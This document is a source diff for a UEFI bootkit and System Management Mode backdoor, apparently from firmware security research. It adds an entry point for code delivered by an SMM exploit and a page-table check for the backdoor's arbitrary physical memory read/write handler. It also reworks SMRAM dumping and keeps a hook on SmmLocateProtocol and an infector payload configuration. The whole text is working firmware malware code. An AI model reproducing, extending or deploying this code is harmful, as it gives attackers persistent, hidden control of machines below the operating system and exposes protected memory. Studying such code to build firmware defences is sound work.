@@ -36,20 +36,16 @@
 #pragma warning(disable: 4054)
 #pragma warning(disable: 4055)
 
-
 typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(PVOID Image);
 
 #define BACKDOOR_RELOCATED_ADDR(_sym_, _addr_) \
         RVATOVA((_addr_), (UINT64)(_sym_) - (UINT64)m_ImageBase)
 
-
 #pragma section(".conf", read, write)
 
-EFI_STATUS
-BackdoorEntryInfected(
-    EFI_HANDLE ImageHandle,
-    EFI_SYSTEM_TABLE *SystemTable
-);
+EFI_STATUS BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable);
+
+EFI_STATUS BackdoorEntryExploit(EFI_SMM_SYSTEM_TABLE2 *Smst);
 
 // PE image section with information for infector
 __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
@@ -58,7 +54,10 @@ __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig =
                                   (PVOID)&BackdoorEntryInfected,
 
                                   // address of old entry point (will be set by infector)
-                                  0
+                                  0,
+
+                                  // entry point to call by SMM exploit
+                                  (PVOID)&BackdoorEntryExploit
                               };
 
 // MSR registers
@@ -80,7 +79,7 @@ EFI_SYSTEM_TABLE *gST;
 EFI_BOOT_SERVICES *gBS;
 EFI_RUNTIME_SERVICES *gRT;
 
-EFI_SMM_SYSTEM_TABLE2 *gSmst = NULL;
+EFI_SMM_SYSTEM_TABLE2 *m_Smst = NULL;
 
 BOOLEAN m_bInfectedImage = FALSE;
 EFI_HANDLE m_ImageHandle = NULL;
@@ -259,9 +258,13 @@ BOOLEAN SerialInit(VOID)
 #define INTERLOCKED_GET(_addr_) InterlockedCompareExchange64((UINT64 *)(_addr_), 0, 0)
 
 #if defined(BACKDOOR_DEBUG_MEM)
+
 #define DbgMsgMem DbgMsg
+
 #else
+
 #define DbgMsgMem
+
 #endif
 
 EFI_STATUS VirtualToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Cr3)
@@ -379,6 +382,55 @@ EFI_STATUS VirtualToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Cr3)
 
     return Status;
 }
+
+BOOLEAN VirtualAddrValid(UINT64 Addr, UINT64 Cr3)
+{
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    
+    PML4Entry.Uint64 = *(UINT64 *)(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));
+
+    if (PML4Entry.Bits.Present)
+    {
+        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;
+        PDPTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
+                                       PDPT_INDEX(Addr) * sizeof(UINT64));
+
+        if (PDPTEntry.Bits.Present)
+        {
+            // check for page size flag
+            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
+            {
+                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;
+                PDEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
+                                             PDE_INDEX(Addr) * sizeof(UINT64));
+
+                if (PDEntry.Bits.Present)
+                {
+                    // check for page size flag
+                    if ((PDEntry.Uint64 & PDPTE_PDE_PS) == 0)
+                    {
+                        X64_PAGE_TABLE_ENTRY_4K PTEntry;
+                        PTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
+                                                     PTE_INDEX(Addr) * sizeof(UINT64));
+                        if (PTEntry.Bits.Present)
+                        {
+                            return TRUE;
+                        }
+                    }
+                    else
+                    {
+                        return TRUE;
+                    }
+                }  
+            }
+            else
+            {
+                return TRUE;
+            }
+        }
+    }
+
+    return FALSE;
+}
 //--------------------------------------------------------------------------------------
 BOOLEAN Check_IA_32e(PCONTROL_REGS ControlRegs)
 {
@@ -387,12 +439,6 @@ BOOLEAN Check_IA_32e(PCONTROL_REGS ControlRegs)
     if (!(ControlRegs->Cr0 & CR0_PG))
     {
         DbgMsg(__FILE__, __LINE__, "ERROR: CR0.PG is not set\r\n");
-        return FALSE;   
-    }
-
-    if (!(ControlRegs->Cr4 & CR4_PAE))
-    {
-        DbgMsg(__FILE__, __LINE__, "ERROR: CR4.PAE is not set\r\n");
         return FALSE;   
     }
 
@@ -602,10 +648,7 @@ VOID BackdoorEntryResident(PVOID Image)
 
     m_ImageBase = Image;
 
-    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Started\r\n");
-
-    // allocate temp buffer for backdoor info        
-    BackdoorInfoInit();   
+    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Started\r\n");    
 
     RegisterProtocolNotifyDxe(
         &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
@@ -683,16 +726,31 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                 );   
             }
 
-            for (i = 0; i < PAGE_SIZE; i += 1)
+            // check for valid address
+            if (VirtualAddrValid(Arg1, __readcr3()))
             {
-                // copy memory contents
-                if (Code == BACKDOOR_SW_DATA_READ_PHYS_MEM)
-                {                    
-                    *(Buff + i) = *(PUCHAR)(Arg1 + i);
-                }
-                else if (Code == BACKDOOR_SW_DATA_WRITE_PHYS_MEM)
+                for (i = 0; i < PAGE_SIZE; i += 1)
                 {
-                    *(PUCHAR)(Arg1 + i) = *(Buff + i);
+                    // copy memory contents
+                    if (Code == BACKDOOR_SW_DATA_READ_PHYS_MEM)
+                    {                    
+                        *(Buff + i) = *(PUCHAR)(Arg1 + i);
+                    }
+                    else if (Code == BACKDOOR_SW_DATA_WRITE_PHYS_MEM)
+                    {
+                        *(PUCHAR)(Arg1 + i) = *(Buff + i);
+                    }
+                }
+            }
+            else
+            {                
+                for (i = 0; i < PAGE_SIZE; i += 1)
+                {
+                    // address is not mapped, fill with zeros
+                    if (Code == BACKDOOR_SW_DATA_READ_PHYS_MEM)
+                    {                    
+                        *(Buff + i) = 0;
+                    }
                 }
             }
 
@@ -961,7 +1019,7 @@ _end:
 #define READ_SAVE_STATE(_id_, _var_)                                                \
                                                                                     \
     Status = SmmCpu->ReadSaveState(SmmCpu,                                          \
-        sizeof((_var_)), (_id_), gSmst->CurrentlyExecutingCpu, (PVOID)&(_var_));    \
+        sizeof((_var_)), (_id_), m_Smst->CurrentlyExecutingCpu, (PVOID)&(_var_));   \
                                                                                     \
     if (EFI_ERROR(Status))                                                          \
     {                                                                               \
@@ -973,7 +1031,7 @@ _end:
                                                                                     \
     (_var_) = (UINT64)(_val_);                                                      \
     Status = SmmCpu->WriteSaveState(SmmCpu,                                         \
-        sizeof((_var_)), (_id_), gSmst->CurrentlyExecutingCpu, (PVOID)&(_var_));    \
+        sizeof((_var_)), (_id_), m_Smst->CurrentlyExecutingCpu, (PVOID)&(_var_));   \
                                                                                     \
     if (EFI_ERROR(Status))                                                          \
     {                                                                               \
@@ -999,7 +1057,7 @@ EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
     m_PeriodicTimerCounter += 1;
     g_BackdoorInfo->TicksCount = m_PeriodicTimerCounter;
 
-    Status = gSmst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (PVOID *)&SmmCpu);
+    Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (PVOID *)&SmmCpu);
     if (Status == EFI_SUCCESS)
     {
         CONTROL_REGS ControlRegs;
@@ -1007,7 +1065,6 @@ EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
 
         READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR0, ControlRegs.Cr0);
         READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR3, ControlRegs.Cr3);
-        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR4, ControlRegs.Cr4);
         READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RCX, Rcx); // user-mode instruction pointer
         READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RDI, Rdi); // 1-st param (code)
         READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RSI, Rsi); // 2-nd param (arg1)
@@ -1024,7 +1081,7 @@ EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
             DbgMsg(
                 __FILE__, __LINE__, 
                 "smm_call(): CPU #%d, RDI = 0x%llx, RSI = 0x%llx, RDX = 0x%llx\r\n", 
-                gSmst->CurrentlyExecutingCpu, Rdi, Rsi, Rdx
+                m_Smst->CurrentlyExecutingCpu, Rdi, Rsi, Rdx
             );
 
             // handle backdoor control request
@@ -1166,12 +1223,14 @@ EFI_STATUS EFIAPI SwDispatch2Handler(
         goto _end;
     }
 
-    Status = gSmst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (PVOID *)&SmmCpu);
+    Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (PVOID *)&SmmCpu);
     if (Status == EFI_SUCCESS)
     {
         UINT64 Code = (UINT64)SwContext->DataPort;
         CONTROL_REGS ControlRegs;
-        UINT64 Rcx = 0;                
+        UINT64 Rcx = 0;         
+
+        ControlRegs.Cr0 = ControlRegs.Cr3 = ControlRegs.Cr4 = 0;
 
         Status = SmmCpu->ReadSaveState(
             SmmCpu, sizeof(ControlRegs.Cr0), EFI_SMM_SAVE_STATE_REGISTER_CR0, 
@@ -1186,16 +1245,6 @@ EFI_STATUS EFIAPI SwDispatch2Handler(
         Status = SmmCpu->ReadSaveState(
             SmmCpu, sizeof(ControlRegs.Cr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, 
             SwContext->SwSmiCpuIndex, (PVOID)&ControlRegs.Cr3
-        );
-        if (EFI_ERROR(Status))
-        {
-            DbgMsg(__FILE__, __LINE__, "ReadSaveState() fails: 0x%X\r\n", Status);
-            goto _end;
-        }
-
-        Status = SmmCpu->ReadSaveState(
-            SmmCpu, sizeof(ControlRegs.Cr4), EFI_SMM_SAVE_STATE_REGISTER_CR4, 
-            SwContext->SwSmiCpuIndex, (PVOID)&ControlRegs.Cr4
         );
         if (EFI_ERROR(Status))
         {
@@ -1314,9 +1363,14 @@ EFI_STATUS EFIAPI EndOfDxeProtocolNotifyHandler(
     DbgMsg(__FILE__, __LINE__, "End of DXE phase\n");
 
     if (g_BackdoorInfo)
-    {
-        UINTN Offset = 0, i = 0;
+    {        
+
+#ifdef USE_SMRAM_AUTO_DUMP
+
+        UINTN Offset = 0, p = 0, i = 0;
         PUCHAR Buff = (PUCHAR)RVATOVA(g_BackdoorInfo, PAGE_SIZE); 
+
+        gBS->SetMem(Buff, MAX_SMRAM_SIZE, 0);
 
         // enumerate available SMRAM regions
         for (;;)
@@ -1331,17 +1385,36 @@ EFI_STATUS EFIAPI EndOfDxeProtocolNotifyHandler(
 
             if (Offset + Info->PhysicalSize <= MAX_SMRAM_SIZE)
             {
-                // copy SMRAM region into the backdoor info structure
-                gBS->CopyMem(Buff + Offset, (VOID *)Info->PhysicalStart, Info->PhysicalSize);
+                // enumerate memory pages for each region
+                for (p = 0; p < Info->PhysicalSize; p += PAGE_SIZE)
+                {
+                    UINT64 Addr = Info->PhysicalStart + p;
+
+                    // check for valid virtual address
+                    if (VirtualAddrValid(Addr, __readcr3()))
+                    {
+                        // copy SMRAM region into the backdoor info structure
+                        gBS->CopyMem(Buff + Offset, (VOID *)Addr, PAGE_SIZE);
+                    }
+
+                    Offset += PAGE_SIZE;
+                }                
             }
             else
             {
                 break;
             }
 
-            Offset += Info->PhysicalSize;
             i += 1;
         }
+
+        g_BackdoorInfo->BackdoorStatus = BACKDOOR_INFO_FULL;
+
+#else // USE_SMRAM_AUTO_DUMP
+
+        g_BackdoorInfo->BackdoorStatus = EFI_INVALID_PARAMETER;
+
+#endif // USE_SMRAM_AUTO_DUMP
 
 #ifdef USE_MSR_SMM_MCA_CAP
 
@@ -1350,8 +1423,7 @@ EFI_STATUS EFIAPI EndOfDxeProtocolNotifyHandler(
         g_BackdoorInfo->SmmFeatureControl = __readmsr(MSR_SMM_FEATURE_CONTROL);
 
 #endif
-
-        g_BackdoorInfo->BackdoorStatus = BACKDOOR_INFO_FULL;
+        
     }    
 
     return EFI_SUCCESS;   
@@ -1391,7 +1463,7 @@ EFI_STATUS EFIAPI new_SmmLocateProtocol(
         PeriodicTimerDispatch2Register(&m_PeriodicTimerDispatchHandle); 
 
         // remove the hook
-        gSmst->SmmLocateProtocol = old_SmmLocateProtocol;           
+        m_Smst->SmmLocateProtocol = old_SmmLocateProtocol;           
     }    
 
     return old_SmmLocateProtocol(Protocol, Registration, Interface);
@@ -1401,7 +1473,7 @@ EFI_STATUS EFIAPI new_SmmLocateProtocol(
 
 EFI_STATUS RegisterProtocolNotifySmm(EFI_GUID *Guid, EFI_SMM_NOTIFY_FN Handler, PVOID *Registration)
 {
-    EFI_STATUS Status = gSmst->SmmRegisterProtocolNotify(Guid, Handler, Registration);
+    EFI_STATUS Status = m_Smst->SmmRegisterProtocolNotify(Guid, Handler, Registration);
     if (Status == EFI_SUCCESS)
     {
         DbgMsg(__FILE__, __LINE__, "SMM protocol notify handler is at "FPTR"\r\n", Handler);
@@ -1417,15 +1489,19 @@ EFI_STATUS RegisterProtocolNotifySmm(EFI_GUID *Guid, EFI_SMM_NOTIFY_FN Handler, 
 VOID BackdoorEntrySmm(VOID)
 {
     PVOID Registration = NULL;
+    EFI_STATUS Status = EFI_SUCCESS;
     EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *PeriodicTimerDispatch = NULL;
-    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;
+    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;    
+
+    DbgMsg(__FILE__, __LINE__, "Running in SMM\r\n");
+    DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", m_Smst);
 
     #define REGISTER_NOTIFY(_name_)                                 \
                                                                     \
         RegisterProtocolNotifySmm(&gEfiSmm##_name_##ProtocolGuid,   \
             _name_##ProtocolNotifyHandler, &Registration)
 
-    EFI_STATUS Status = gSmst->SmmLocateProtocol(
+    Status = m_Smst->SmmLocateProtocol(
         &gEfiSmmPeriodicTimerDispatch2ProtocolGuid, NULL, 
         &PeriodicTimerDispatch
     );
@@ -1443,7 +1519,7 @@ VOID BackdoorEntrySmm(VOID)
         REGISTER_NOTIFY(PeriodicTimerDispatch2);    
     }
 
-    Status = gSmst->SmmLocateProtocol(
+    Status = m_Smst->SmmLocateProtocol(
         &gEfiSmmSwDispatch2ProtocolGuid, NULL, 
         &SwDispatch
     );
@@ -1467,21 +1543,18 @@ VOID BackdoorEntrySmm(VOID)
 
     DbgMsg(
         __FILE__, __LINE__, "Hooking SmmLocateProtocol(): "FPTR" -> "FPTR"\r\n",
-        gSmst->SmmLocateProtocol, new_SmmLocateProtocol
+        m_Smst->SmmLocateProtocol, new_SmmLocateProtocol
     );
 
     // hook SmmLocateProtocol() SMST function to get execution during OS boot phase
-    old_SmmLocateProtocol = gSmst->SmmLocateProtocol;
-    gSmst->SmmLocateProtocol = new_SmmLocateProtocol;
+    old_SmmLocateProtocol = m_Smst->SmmLocateProtocol;
+    m_Smst->SmmLocateProtocol = new_SmmLocateProtocol;
 
 #endif // USE_PERIODIC_TIMER
 
 }
 //--------------------------------------------------------------------------------------
-EFI_STATUS
-BackdoorEntryInfected(
-    EFI_HANDLE ImageHandle,
-    EFI_SYSTEM_TABLE *SystemTable)
+EFI_STATUS BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
 {
     PVOID Base = BackdoorImageAddress();
 
@@ -1497,10 +1570,17 @@ BackdoorEntryInfected(
     );
 }
 //--------------------------------------------------------------------------------------
-EFI_STATUS 
-BackdoorEntry(
-    IN EFI_HANDLE ImageHandle,
-    IN EFI_SYSTEM_TABLE *SystemTable) 
+EFI_STATUS BackdoorEntryExploit(EFI_SMM_SYSTEM_TABLE2 *Smst)
+{
+    m_Smst = Smst;
+
+    // run SMM code
+    BackdoorEntrySmm();
+
+    return EFI_SUCCESS;
+}
+//--------------------------------------------------------------------------------------
+EFI_STATUS BackdoorEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) 
 {
     EFI_STATUS Ret = EFI_SUCCESS, Status = EFI_SUCCESS;
     PVOID Image = NULL;            
@@ -1521,7 +1601,7 @@ BackdoorEntry(
         ConsoleInit();
 
         // initialize serial port I/O for debug messages
-        SerialInit();             
+        SerialInit();        
 
         DbgMsg(__FILE__, __LINE__, "***********************************************\r\n");
         DbgMsg(__FILE__, __LINE__, "                                               \r\n");
@@ -1533,40 +1613,47 @@ BackdoorEntry(
         DbgMsg(__FILE__, __LINE__, "***********************************************\r\n");
         DbgMsg(__FILE__, __LINE__, "                                               \r\n");
 
-        // get current image information
-        gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);    
-        
-        if (m_ImageBase == NULL)
+        // allocate temp buffer for backdoor info        
+        BackdoorInfoInit();   
+
+        m_bInfectedImage = FALSE;
+
+        if (ImageHandle != NULL)
         {
-            // bootkit was loaded as EFI application or driver
-            m_bInfectedImage = FALSE;
-            m_ImageBase = LoadedImage->ImageBase;
-
-            DbgMsg(__FILE__, __LINE__, "Started as standalone driver/app\r\n");
-        }
-        else
-        {
-            // bootkit was loaded as infector payload
-            m_bInfectedImage = TRUE;
-
-            DbgMsg(__FILE__, __LINE__, "Started as infector payload\r\n");
-        }
-
-        DbgMsg(__FILE__, __LINE__, "Image base address is "FPTR"\r\n", m_ImageBase);    
-
-        // copy image to the new location in EFI runtime memory
-        if ((Image = BackdoorImageReallocate(m_ImageBase)) != NULL)
-        {
-            BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)BACKDOOR_RELOCATED_ADDR(
-                BackdoorEntryResident, 
-                Image
-            );
-
-            DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
+            // get current image information
+            gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);    
             
-            // initialize resident code of the bootkit
-            pEntry(Image);
-        } 
+            if (m_ImageBase == NULL)
+            {
+                // bootkit was loaded as EFI application or driver                
+                m_ImageBase = LoadedImage->ImageBase;
+
+                DbgMsg(__FILE__, __LINE__, "Started as standalone driver/app\r\n");
+            }
+            else
+            {
+                // bootkit was loaded as infector payload
+                m_bInfectedImage = TRUE;
+
+                DbgMsg(__FILE__, __LINE__, "Started as infector payload\r\n");
+            }
+
+            DbgMsg(__FILE__, __LINE__, "Image base address is "FPTR"\r\n", m_ImageBase);    
+
+            // copy image to the new location in EFI runtime memory
+            if ((Image = BackdoorImageReallocate(m_ImageBase)) != NULL)
+            {
+                BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)BACKDOOR_RELOCATED_ADDR(
+                    BackdoorEntryResident, 
+                    Image
+                );
+
+                DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
+                
+                // initialize resident code of the bootkit
+                pEntry(Image);
+            } 
+        }
     }     
 
     if ((g_BackdoorInfo = BackdoorInfoGet()) != NULL)
@@ -1584,38 +1671,34 @@ BackdoorEntry(
     {
         BOOLEAN bInSmram = FALSE;
 
+        if (g_BackdoorInfo)
+        {
+            Status = gBS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (PVOID *)&SmmAccess);
+            if (Status == EFI_SUCCESS)
+            {
+                UINTN SmramMapSize = PAGE_SIZE - sizeof(BACKDOOR_INFO);
+
+                // get SMRAM information
+                Status = SmmAccess->GetCapabilities(
+                    SmmAccess,
+                    &SmramMapSize,
+                    g_BackdoorInfo->SmramMap
+                );
+                if (Status != EFI_SUCCESS)
+                {
+                    DbgMsg(__FILE__, __LINE__, "GetCapabilities() fails: 0x%X\r\n", Status);
+                }
+            }
+        }
+
         // check if running in SMM
         SmmBase->InSmm(SmmBase, &bInSmram);
 
         if (bInSmram)
         {
-            DbgMsg(__FILE__, __LINE__, "Running in SMM\r\n");
-
-            if (g_BackdoorInfo)
-            {
-                Status = gBS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (PVOID *)&SmmAccess);
-                if (Status == EFI_SUCCESS)
-                {
-                    UINTN SmramMapSize = PAGE_SIZE - sizeof(BACKDOOR_INFO);
-
-                    // get SMRAM information
-                    Status = SmmAccess->GetCapabilities(
-                        SmmAccess,
-                        &SmramMapSize,
-                        g_BackdoorInfo->SmramMap
-                    );
-                    if (Status != EFI_SUCCESS)
-                    {
-                        DbgMsg(__FILE__, __LINE__, "GetCapabilities() fails: 0x%X\r\n", Status);
-                    }
-                }
-            }
-
-            Status = SmmBase->GetSmstLocation(SmmBase, &gSmst);
+            Status = SmmBase->GetSmstLocation(SmmBase, &m_Smst);
             if (Status == EFI_SUCCESS)
-            {
-                DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", gSmst);
-
+            {                
                 // run SMM code
                 BackdoorEntrySmm();
             }   
